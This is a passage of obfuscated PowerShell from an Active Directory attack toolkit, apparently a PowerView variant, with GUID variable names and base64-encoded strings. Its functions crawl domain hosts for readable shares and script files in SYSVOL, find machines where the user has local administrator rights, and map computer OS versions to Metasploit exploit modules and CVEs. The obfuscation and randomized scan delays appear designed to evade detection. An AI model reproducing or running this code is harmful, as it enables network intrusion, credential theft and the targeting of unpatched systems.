                Write-Verbose "[*] Enumerating server ${5c10572590774a67ad57cb4f99935a3e} (${6a1d2d10aeb941458787cbe1335cc6ce} of $(${c096522c7bbe4c7aaadf99843e3b09fb}.count))"
                icm -ScriptBlock ${59a37d6213694042882ad9072c1f5a73} -ArgumentList ${5c10572590774a67ad57cb4f99935a3e}, $False, ${a121bc72cbc943629c0ca150ad2e7524}, ${3c5f3592b9554466a66f62fb20539434}, ${e367637d3d7c4d9ba14856581cd375ae}
            }
        }
    }
}
function Invoke-FileFinder {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        ${c096522c7bbe4c7aaadf99843e3b09fb},
        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        ${b58b7e66c34147d0b1030dea35e43084},
        [String]
        ${a2fbc6e3cd88453ea35f8017927b51ae},
        [String]
        ${c4ea8c745d00425ab685ca6107c29659},
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        ${ed68d551e9c6407685a80bc97523ef00},
        [Switch]
        ${e5afd82ef21d416c91bc672d94d9a83c},
        [Switch]
        ${b6f0f66e35a747f0a8ca9060421541af},
        [String[]]
        ${a182f316ca27474f82b6fcb2ec2aac3c},
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        ${c44a26a2bf2d4fb8aa8681c7312364e5},
        [String]
        ${b5e988a72dd1462eaa092c8c929e58f5},
        [String]
        ${c544349465b54e9c91c2485eb6d68658},
        [String]
        ${d11a218100f44535a0147acbe501fa44},
        [Switch]
        ${e5c32749790744a48662a79de8b2ae9b},
        [Switch]
        ${a5cfc26c73fe4a1592c3f8b33622622f},
        [Switch]
        ${a21d3b23633f47f8bc07461d561a6f3d},
        [Switch]
        ${d721ac1d513f48189e0eb86d94c61266},
        [Switch]
        ${ddf4152de99f47b5818c689d1c2bd9de},
        [String]
        ${a3653a86a8bf4a758cfe5d1942c0bcde},
        [Switch]
        ${bc80c7c347ff4aac8ae95d547f4293ec},
        [Switch]
        ${e6e5f48677934e8a9b673971d54cb88b},
        [UInt32]
        ${b8c8aa64938b4bac902fc98afa97c067} = 0,
        [Double]
        ${d4ce8c8227174786a6c6642ad7a1cbfb} = .3,
        [String]
        ${afa30c601e734738b32424a6234484e4},
        [String]
        ${a3bf4f2494234d89b62febc9f379f624},
        [Switch]
        ${e9a66cc9388c4a9b8dd06d6ed60e1b0f},
        [Switch]
        ${eb138db481d140eabfeb0955650178d2},
        [ValidateRange(1,100)] 
        [Int]
        ${af65be9c26e74dca807a99d4facf1a11},
        [Switch]
        ${d304e44efca5442daf28ae2e0a813411},
        [System.Management.Automation.PSCredential]
        ${a6f9764977ce40faa20533a56574a78b} = [System.Management.Automation.PSCredential]::Empty
    )
    begin {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))]) {
            $DebugPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
        }
        ${a000573bb5614405b8a5a68467724c29} = New-Object System.Random
        Write-Verbose "[*] Running Invoke-FileFinder with delay of ${b8c8aa64938b4bac902fc98afa97c067}"
        ${3dd101277ed94d96a222ed2c5eb91979} = @()
        [String[]] ${3c5f3592b9554466a66f62fb20539434} = @("C$", $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBEAE0ASQBOACQA'))))
        if (${e5c32749790744a48662a79de8b2ae9b}) {
            if (${a5cfc26c73fe4a1592c3f8b33622622f}) {
                ${3c5f3592b9554466a66f62fb20539434} = @()
            }
            else {
                ${3c5f3592b9554466a66f62fb20539434} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBEAE0ASQBOACQA'))))
            }
        }
        if (${a5cfc26c73fe4a1592c3f8b33622622f}) {
            if (${e5c32749790744a48662a79de8b2ae9b}) {
                ${3c5f3592b9554466a66f62fb20539434} = @()
            }
            else {
                ${3c5f3592b9554466a66f62fb20539434} = @("C$")
            }
        }
        if(!${bc80c7c347ff4aac8ae95d547f4293ec}) {
            if (${a3653a86a8bf4a758cfe5d1942c0bcde} -and (Test-Path -Path ${a3653a86a8bf4a758cfe5d1942c0bcde})) { rd -Path ${a3653a86a8bf4a758cfe5d1942c0bcde} }
        }
        if (${c44a26a2bf2d4fb8aa8681c7312364e5}) {
            ForEach ($Term in gc -Path ${c44a26a2bf2d4fb8aa8681c7312364e5}) {
                if (($Term -ne $Null) -and ($Term.trim() -ne '')) {
                    ${a182f316ca27474f82b6fcb2ec2aac3c} += $Term
                }
            }
        }
        if(${afa30c601e734738b32424a6234484e4}) {
            ${575c90e058ca4f27b93edf3f2aea5074} = @(${afa30c601e734738b32424a6234484e4})
        }
        elseif(${e9a66cc9388c4a9b8dd06d6ed60e1b0f}) {
            ${575c90e058ca4f27b93edf3f2aea5074} = Get-NetForestDomain | % { $_.Name }
        }
        else {
            ${575c90e058ca4f27b93edf3f2aea5074} = @( (Get-NetDomain).name )
        }
        if(${ed68d551e9c6407685a80bc97523ef00}) {
            ForEach ($Item in gc -Path ${ed68d551e9c6407685a80bc97523ef00}) {
                if (($Item -ne $Null) -and ($Item.trim() -ne '')) {
                    ${d1e9378c77f74922b541713bbdb6e6f4} = $Item.Split("`t")[0]
                    ${3dd101277ed94d96a222ed2c5eb91979} += ${d1e9378c77f74922b541713bbdb6e6f4}
                }
            }
        }
        if(${eb138db481d140eabfeb0955650178d2}) {
            ForEach (${afa30c601e734738b32424a6234484e4} in ${575c90e058ca4f27b93edf3f2aea5074}) {
                ${47dd2eb93601412bb927be7581b2006b} = "\\${afa30c601e734738b32424a6234484e4}\SYSVOL\"
                Write-Verbose "[*] Adding share search path ${47dd2eb93601412bb927be7581b2006b}"
                ${3dd101277ed94d96a222ed2c5eb91979} += ${47dd2eb93601412bb927be7581b2006b}
            }
            if(!${a182f316ca27474f82b6fcb2ec2aac3c}) {
                ${a182f316ca27474f82b6fcb2ec2aac3c} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgB2AGIAcwA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBiAGEAdAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBwAHMAMQA='))))
            }
        }
        else {
            if(${b58b7e66c34147d0b1030dea35e43084}) {
                ${c096522c7bbe4c7aaadf99843e3b09fb} = gc -Path ${b58b7e66c34147d0b1030dea35e43084}
            }
            else {
                [array]${c096522c7bbe4c7aaadf99843e3b09fb} = @()
                ForEach (${afa30c601e734738b32424a6234484e4} in ${575c90e058ca4f27b93edf3f2aea5074}) {
                    Write-Verbose "[*] Querying domain ${afa30c601e734738b32424a6234484e4} for hosts"
                    ${c096522c7bbe4c7aaadf99843e3b09fb} += Get-NetComputer -a48507564a8248e5b01d3a563f4bc865 ${a2fbc6e3cd88453ea35f8017927b51ae} -c4d5e29aa5ae43dc97a75d43cbc64f02 ${c4ea8c745d00425ab685ca6107c29659} -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624}
                }
            }
            ${c096522c7bbe4c7aaadf99843e3b09fb} = ${c096522c7bbe4c7aaadf99843e3b09fb} | ? { $_ } | sort -Unique | sort { Get-Random }
            if($(${c096522c7bbe4c7aaadf99843e3b09fb}.Count) -eq 0) {
                throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAaABvAHMAdABzACAAZgBvAHUAbgBkACEA')))
            }
        }
        ${59a37d6213694042882ad9072c1f5a73} = {
            param(${c096522c7bbe4c7aaadf99843e3b09fb}, ${be0265651b1f4b6699aaa7db34ab7aee}, ${3c5f3592b9554466a66f62fb20539434}, ${a182f316ca27474f82b6fcb2ec2aac3c}, ${a21d3b23633f47f8bc07461d561a6f3d}, ${e5afd82ef21d416c91bc672d94d9a83c}, ${d721ac1d513f48189e0eb86d94c61266}, ${b6f0f66e35a747f0a8ca9060421541af}, ${ddf4152de99f47b5818c689d1c2bd9de}, ${a3653a86a8bf4a758cfe5d1942c0bcde}, ${d304e44efca5442daf28ae2e0a813411}, ${a6f9764977ce40faa20533a56574a78b})
            Write-Verbose "ComputerName: ${c096522c7bbe4c7aaadf99843e3b09fb}"
            Write-Verbose "ExcludedShares: ${3c5f3592b9554466a66f62fb20539434}"
            ${9868befa74314e65b6e282fc31f6f712} = @()
            if(${c096522c7bbe4c7aaadf99843e3b09fb}.StartsWith("\\")) {
                ${9868befa74314e65b6e282fc31f6f712} += ${c096522c7bbe4c7aaadf99843e3b09fb}
            }
            else {
                ${4ec9c050c4c74ff6a6d4be971e455652} = $True
                if(${be0265651b1f4b6699aaa7db34ab7aee}) {
                    ${4ec9c050c4c74ff6a6d4be971e455652} = Test-Connection -Count 1 -Quiet -ComputerName ${c096522c7bbe4c7aaadf99843e3b09fb}
                }
                if(${4ec9c050c4c74ff6a6d4be971e455652}) {
                    ${3dd101277ed94d96a222ed2c5eb91979} = Get-NetShare -c096522c7bbe4c7aaadf99843e3b09fb ${c096522c7bbe4c7aaadf99843e3b09fb}
                    ForEach (${d1e9378c77f74922b541713bbdb6e6f4} in ${3dd101277ed94d96a222ed2c5eb91979}) {
                        ${de35d4e716844b459615f7bc8855e381} = ${d1e9378c77f74922b541713bbdb6e6f4}.shi1_netname
                        ${efe450d53b084f3cb286d6a758f6ee94} = '\\'+${c096522c7bbe4c7aaadf99843e3b09fb}+'\'+${de35d4e716844b459615f7bc8855e381}
                        if ((${de35d4e716844b459615f7bc8855e381}) -and (${de35d4e716844b459615f7bc8855e381}.trim() -ne '')) {
                            if (${3c5f3592b9554466a66f62fb20539434} -NotContains ${de35d4e716844b459615f7bc8855e381}.ToUpper()) {
                                try {
                                    $Null = [IO.Directory]::GetFiles(${efe450d53b084f3cb286d6a758f6ee94})
                                    ${9868befa74314e65b6e282fc31f6f712} += ${efe450d53b084f3cb286d6a758f6ee94}
                                }
                                catch {
                                    Write-Debug "[!] No access to ${efe450d53b084f3cb286d6a758f6ee94}"
                                }
                            }
                        }
                    }
                }
            }
            ForEach(${d1e9378c77f74922b541713bbdb6e6f4} in ${9868befa74314e65b6e282fc31f6f712}) {
                ${0b117cfeac8d42ce884fde1c0675bb21} =  @{
                    'Path' = ${d1e9378c77f74922b541713bbdb6e6f4}
                    'Terms' = ${a182f316ca27474f82b6fcb2ec2aac3c}
                    'OfficeDocs' = ${e5afd82ef21d416c91bc672d94d9a83c}
                    'FreshEXEs' = ${b6f0f66e35a747f0a8ca9060421541af}
                    'LastAccessTime' = ${b5e988a72dd1462eaa092c8c929e58f5}
                    'LastWriteTime' = ${c544349465b54e9c91c2485eb6d68658}
                    'CreationTime' = ${d11a218100f44535a0147acbe501fa44}
                    'ExcludeFolders' = ${a21d3b23633f47f8bc07461d561a6f3d}
                    'ExcludeHidden' = ${d721ac1d513f48189e0eb86d94c61266}
                    'CheckWriteAccess' = ${ddf4152de99f47b5818c689d1c2bd9de}
                    'OutFile' = ${a3653a86a8bf4a758cfe5d1942c0bcde}
                    'UsePSDrive' = ${d304e44efca5442daf28ae2e0a813411}
                    'Credential' = ${a6f9764977ce40faa20533a56574a78b}
                }
                Find-InterestingFile @0b117cfeac8d42ce884fde1c0675bb21
            }
        }
    }
    process {
        if(${af65be9c26e74dca807a99d4facf1a11}) {
            Write-Verbose "Using threading with threads = ${af65be9c26e74dca807a99d4facf1a11}"
            ${9bbea18b6b074c14aeae828437f12380} = @{
                'Ping' = $(-not ${e6e5f48677934e8a9b673971d54cb88b})
                'ExcludedShares' = ${3c5f3592b9554466a66f62fb20539434}
                'Terms' = ${a182f316ca27474f82b6fcb2ec2aac3c}
                'ExcludeFolders' = ${a21d3b23633f47f8bc07461d561a6f3d}
                'OfficeDocs' = ${e5afd82ef21d416c91bc672d94d9a83c}
                'ExcludeHidden' = ${d721ac1d513f48189e0eb86d94c61266}
                'FreshEXEs' = ${b6f0f66e35a747f0a8ca9060421541af}
                'CheckWriteAccess' = ${ddf4152de99f47b5818c689d1c2bd9de}
                'OutFile' = ${a3653a86a8bf4a758cfe5d1942c0bcde}
                'UsePSDrive' = ${d304e44efca5442daf28ae2e0a813411}
                'Credential' = ${a6f9764977ce40faa20533a56574a78b}
            }
            if(${3dd101277ed94d96a222ed2c5eb91979}) {
                Invoke-ThreadedFunction -c096522c7bbe4c7aaadf99843e3b09fb ${3dd101277ed94d96a222ed2c5eb91979} -ba541df15a284a3187207310217a6e04 ${59a37d6213694042882ad9072c1f5a73} -eeeefbd7f1ac43118ed9ac4a4cb9dd01 ${9bbea18b6b074c14aeae828437f12380}
            }
            else {
                Invoke-ThreadedFunction -c096522c7bbe4c7aaadf99843e3b09fb ${c096522c7bbe4c7aaadf99843e3b09fb} -ba541df15a284a3187207310217a6e04 ${59a37d6213694042882ad9072c1f5a73} -eeeefbd7f1ac43118ed9ac4a4cb9dd01 ${9bbea18b6b074c14aeae828437f12380}
            }        
        }
        else {
            if(${3dd101277ed94d96a222ed2c5eb91979}){
                ${c096522c7bbe4c7aaadf99843e3b09fb} = ${3dd101277ed94d96a222ed2c5eb91979}
            }
            elseif(-not ${e6e5f48677934e8a9b673971d54cb88b} -and (${c096522c7bbe4c7aaadf99843e3b09fb}.count -gt 1)) {
                ${be0265651b1f4b6699aaa7db34ab7aee} = {param(${c096522c7bbe4c7aaadf99843e3b09fb}) if(Test-Connection -ComputerName ${c096522c7bbe4c7aaadf99843e3b09fb} -Count 1 -Quiet -ErrorAction Stop){${c096522c7bbe4c7aaadf99843e3b09fb}}}
                ${c096522c7bbe4c7aaadf99843e3b09fb} = Invoke-ThreadedFunction -e0be29f777aa4bc98faa14015f17190f -c096522c7bbe4c7aaadf99843e3b09fb ${c096522c7bbe4c7aaadf99843e3b09fb} -ba541df15a284a3187207310217a6e04 ${be0265651b1f4b6699aaa7db34ab7aee} -af65be9c26e74dca807a99d4facf1a11 100
            }
            Write-Verbose "[*] Total number of active hosts: $(${c096522c7bbe4c7aaadf99843e3b09fb}.count)"
            ${6a1d2d10aeb941458787cbe1335cc6ce} = 0
            ${c096522c7bbe4c7aaadf99843e3b09fb} | ? {$_} | % {
                Write-Verbose "Computer: $_"
                ${6a1d2d10aeb941458787cbe1335cc6ce} = ${6a1d2d10aeb941458787cbe1335cc6ce} + 1
                sleep -Seconds ${a000573bb5614405b8a5a68467724c29}.Next((1-${d4ce8c8227174786a6c6642ad7a1cbfb})*${b8c8aa64938b4bac902fc98afa97c067}, (1+${d4ce8c8227174786a6c6642ad7a1cbfb})*${b8c8aa64938b4bac902fc98afa97c067})
                Write-Verbose "[*] Enumerating server $_ (${6a1d2d10aeb941458787cbe1335cc6ce} of $(${c096522c7bbe4c7aaadf99843e3b09fb}.count))"
                icm -ScriptBlock ${59a37d6213694042882ad9072c1f5a73} -ArgumentList $_, $False, ${3c5f3592b9554466a66f62fb20539434}, ${a182f316ca27474f82b6fcb2ec2aac3c}, ${a21d3b23633f47f8bc07461d561a6f3d}, ${e5afd82ef21d416c91bc672d94d9a83c}, ${d721ac1d513f48189e0eb86d94c61266}, ${b6f0f66e35a747f0a8ca9060421541af}, ${ddf4152de99f47b5818c689d1c2bd9de}, ${a3653a86a8bf4a758cfe5d1942c0bcde}, ${d304e44efca5442daf28ae2e0a813411}, ${a6f9764977ce40faa20533a56574a78b}                
            }
        }
    }
}
function Find-LocalAdminAccess {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        ${c096522c7bbe4c7aaadf99843e3b09fb},
        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        ${b58b7e66c34147d0b1030dea35e43084},
        [String]
        ${a2fbc6e3cd88453ea35f8017927b51ae},
        [String]
        ${c4ea8c745d00425ab685ca6107c29659},
        [Switch]
        ${e6e5f48677934e8a9b673971d54cb88b},
        [UInt32]
        ${b8c8aa64938b4bac902fc98afa97c067} = 0,
        [Double]
        ${d4ce8c8227174786a6c6642ad7a1cbfb} = .3,
        [String]
        ${afa30c601e734738b32424a6234484e4},
        [String]
        ${a3bf4f2494234d89b62febc9f379f624},
        [Switch]
        ${e9a66cc9388c4a9b8dd06d6ed60e1b0f},
        [ValidateRange(1,100)] 
        [Int]
        ${af65be9c26e74dca807a99d4facf1a11}
    )
    begin {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))]) {
            $DebugPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
        }
        ${a000573bb5614405b8a5a68467724c29} = New-Object System.Random
        Write-Verbose "[*] Running Find-LocalAdminAccess with delay of ${b8c8aa64938b4bac902fc98afa97c067}"
        if(!${c096522c7bbe4c7aaadf99843e3b09fb}) {
            if(${afa30c601e734738b32424a6234484e4}) {
                ${575c90e058ca4f27b93edf3f2aea5074} = @(${afa30c601e734738b32424a6234484e4})
            }
            elseif(${e9a66cc9388c4a9b8dd06d6ed60e1b0f}) {
                ${575c90e058ca4f27b93edf3f2aea5074} = Get-NetForestDomain | % { $_.Name }
            }
            else {
                ${575c90e058ca4f27b93edf3f2aea5074} = @( (Get-NetDomain).name )
            }
            if(${b58b7e66c34147d0b1030dea35e43084}) {
                ${c096522c7bbe4c7aaadf99843e3b09fb} = gc -Path ${b58b7e66c34147d0b1030dea35e43084}
            }
            else {
                [array]${c096522c7bbe4c7aaadf99843e3b09fb} = @()
                ForEach (${afa30c601e734738b32424a6234484e4} in ${575c90e058ca4f27b93edf3f2aea5074}) {
                    Write-Verbose "[*] Querying domain ${afa30c601e734738b32424a6234484e4} for hosts"
                    ${c096522c7bbe4c7aaadf99843e3b09fb} += Get-NetComputer -a48507564a8248e5b01d3a563f4bc865 ${a2fbc6e3cd88453ea35f8017927b51ae} -c4d5e29aa5ae43dc97a75d43cbc64f02 ${c4ea8c745d00425ab685ca6107c29659} -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624}
                }
            }
            ${c096522c7bbe4c7aaadf99843e3b09fb} = ${c096522c7bbe4c7aaadf99843e3b09fb} | ? { $_ } | sort -Unique | sort { Get-Random }
            if($(${c096522c7bbe4c7aaadf99843e3b09fb}.Count) -eq 0) {
                throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAaABvAHMAdABzACAAZgBvAHUAbgBkACEA')))
            }
        }
        ${59a37d6213694042882ad9072c1f5a73} = {
            param(${c096522c7bbe4c7aaadf99843e3b09fb}, ${be0265651b1f4b6699aaa7db34ab7aee})
            ${4ec9c050c4c74ff6a6d4be971e455652} = $True
            if(${be0265651b1f4b6699aaa7db34ab7aee}) {
                ${4ec9c050c4c74ff6a6d4be971e455652} = Test-Connection -Count 1 -Quiet -ComputerName ${c096522c7bbe4c7aaadf99843e3b09fb}
            }
            if(${4ec9c050c4c74ff6a6d4be971e455652}) {
                ${e2580a675bdd454da8d476e3dbdd4068} = Invoke-CheckLocalAdminAccess -c096522c7bbe4c7aaadf99843e3b09fb ${c096522c7bbe4c7aaadf99843e3b09fb}
                if (${e2580a675bdd454da8d476e3dbdd4068}) {
                    ${c096522c7bbe4c7aaadf99843e3b09fb}
                }
            }
        }
    }
    process {
        if(${af65be9c26e74dca807a99d4facf1a11}) {
            Write-Verbose "Using threading with threads = ${af65be9c26e74dca807a99d4facf1a11}"
            ${9bbea18b6b074c14aeae828437f12380} = @{
                'Ping' = $(-not ${e6e5f48677934e8a9b673971d54cb88b})
            }
            Invoke-ThreadedFunction -c096522c7bbe4c7aaadf99843e3b09fb ${c096522c7bbe4c7aaadf99843e3b09fb} -ba541df15a284a3187207310217a6e04 ${59a37d6213694042882ad9072c1f5a73} -eeeefbd7f1ac43118ed9ac4a4cb9dd01 ${9bbea18b6b074c14aeae828437f12380}
        }
        else {
            if(-not ${e6e5f48677934e8a9b673971d54cb88b} -and (${c096522c7bbe4c7aaadf99843e3b09fb}.count -ne 1)) {
                ${be0265651b1f4b6699aaa7db34ab7aee} = {param(${c096522c7bbe4c7aaadf99843e3b09fb}) if(Test-Connection -ComputerName ${c096522c7bbe4c7aaadf99843e3b09fb} -Count 1 -Quiet -ErrorAction Stop){${c096522c7bbe4c7aaadf99843e3b09fb}}}
                ${c096522c7bbe4c7aaadf99843e3b09fb} = Invoke-ThreadedFunction -e0be29f777aa4bc98faa14015f17190f -c096522c7bbe4c7aaadf99843e3b09fb ${c096522c7bbe4c7aaadf99843e3b09fb} -ba541df15a284a3187207310217a6e04 ${be0265651b1f4b6699aaa7db34ab7aee} -af65be9c26e74dca807a99d4facf1a11 100
            }
            Write-Verbose "[*] Total number of active hosts: $(${c096522c7bbe4c7aaadf99843e3b09fb}.count)"
            ${6a1d2d10aeb941458787cbe1335cc6ce} = 0
            ForEach (${5c10572590774a67ad57cb4f99935a3e} in ${c096522c7bbe4c7aaadf99843e3b09fb}) {
                ${6a1d2d10aeb941458787cbe1335cc6ce} = ${6a1d2d10aeb941458787cbe1335cc6ce} + 1
                sleep -Seconds ${a000573bb5614405b8a5a68467724c29}.Next((1-${d4ce8c8227174786a6c6642ad7a1cbfb})*${b8c8aa64938b4bac902fc98afa97c067}, (1+${d4ce8c8227174786a6c6642ad7a1cbfb})*${b8c8aa64938b4bac902fc98afa97c067})
                Write-Verbose "[*] Enumerating server ${5c10572590774a67ad57cb4f99935a3e} (${6a1d2d10aeb941458787cbe1335cc6ce} of $(${c096522c7bbe4c7aaadf99843e3b09fb}.count))"
                icm -ScriptBlock ${59a37d6213694042882ad9072c1f5a73} -ArgumentList ${5c10572590774a67ad57cb4f99935a3e}, $False, ${a3653a86a8bf4a758cfe5d1942c0bcde}, ${2590a9f718e54db2a9d598a9b43c8cff}, ${87ff753a1bf743018656e856dbc06754}
            }
        }
    }
}
function Get-ExploitableSystem {
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        ${c096522c7bbe4c7aaadf99843e3b09fb} = '*',
        [String]
        ${a28200ed725246a29b1b7a8486b7f537},
        [String]
        ${d76bdcf1942742f8b764521cbfb67b89} = '*',
        [String]
        ${eae5323dd00f4b2ea8a6693e8fde4863} = '*',
        [String]
        ${a48507564a8248e5b01d3a563f4bc865},
        [Switch]
        ${be0265651b1f4b6699aaa7db34ab7aee},
        [String]
        ${afa30c601e734738b32424a6234484e4},
        [String]
        ${a3bf4f2494234d89b62febc9f379f624},
        [String]
        ${c4d5e29aa5ae43dc97a75d43cbc64f02},
        [Switch]
        ${d94ab56af5434f32a3756027d2d13aa3},
        [ValidateRange(1,10000)] 
        [Int]
        ${c8e7665cd4cc41d88229c3536a114f1b} = 200
    )
    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABHAHIAYQBiAGIAaQBuAGcAIABjAG8AbQBwAHUAdABlAHIAIABhAGMAYwBvAHUAbgB0AHMAIABmAHIAbwBtACAAQQBjAHQAaQB2AGUAIABEAGkAcgBlAGMAdABvAHIAeQAuAC4ALgA=')))
    ${b7c7dc72fa2f4131a9fd6375f270ed88} = New-Object System.Data.DataTable 
    $Null = ${b7c7dc72fa2f4131a9fd6375f270ed88}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAHMAdABuAGEAbQBlAA=='))))       
    $Null = ${b7c7dc72fa2f4131a9fd6375f270ed88}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A'))))
    $Null = ${b7c7dc72fa2f4131a9fd6375f270ed88}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA=='))))
    $Null = ${b7c7dc72fa2f4131a9fd6375f270ed88}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBvAG4A'))))
    Get-NetComputer -c489e407a44b4d378d17e6f8021054c1 @PSBoundParameters | % {
        ${cf52030c7f1a444f9d91b96a9a2ffad3} = $_.dnshostname
        ${3e2464035ff54bb9a0eac81749e4936d} = $_.operatingsystem
        ${7afe46d69e624af8aad20d7c94adee8e} = $_.operatingsystemservicepack
        ${9f1aa60fb88540cd99a416484509e1b7} = $_.lastlogon
        ${1c2caa78a0b546da802ed16f98143a8d} = $_.useraccountcontrol
        ${6f4ac32a03b7466d8910db694e412a31} = [convert]::ToString($_.useraccountcontrol,2)
        ${95cb84f846664db795174e7ac12cd2e9} = ${6f4ac32a03b7466d8910db694e412a31}.Length - 2
        ${08f8efbbab1147b6900aec88b18a3655} = ${6f4ac32a03b7466d8910db694e412a31}.Substring(${95cb84f846664db795174e7ac12cd2e9},1)
        if (${08f8efbbab1147b6900aec88b18a3655}  -eq 0) {
            $Null = ${b7c7dc72fa2f4131a9fd6375f270ed88}.Rows.Add(${cf52030c7f1a444f9d91b96a9a2ffad3},${3e2464035ff54bb9a0eac81749e4936d},${7afe46d69e624af8aad20d7c94adee8e},${9f1aa60fb88540cd99a416484509e1b7})
        }
    }
    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABMAG8AYQBkAGkAbgBnACAAZQB4AHAAbABvAGkAdAAgAGwAaQBzAHQAIABmAG8AcgAgAGMAcgBpAHQAaQBjAGEAbAAgAG0AaQBzAHMAaQBuAGcAIABwAGEAdABjAGgAZQBzAC4ALgAuAA==')))
    ${8a58d1348c7d42029e8592b98fd4e332} = New-Object System.Data.DataTable 
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))) 
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA=='))))
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBzAGYATQBvAGQAdQBsAGUA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBWAEUA'))))
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgADcA'))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAxADAAXwAwADYAMQBfAHMAcABvAG8AbABzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADEAMAAtADIANwAyADkA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADMAXwAwADIANgBfAGQAYwBvAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMwA1ADIALwA='))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADUAXwAwADEANwBfAG0AcwBtAHEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADAAMAA1ADkA'))))  
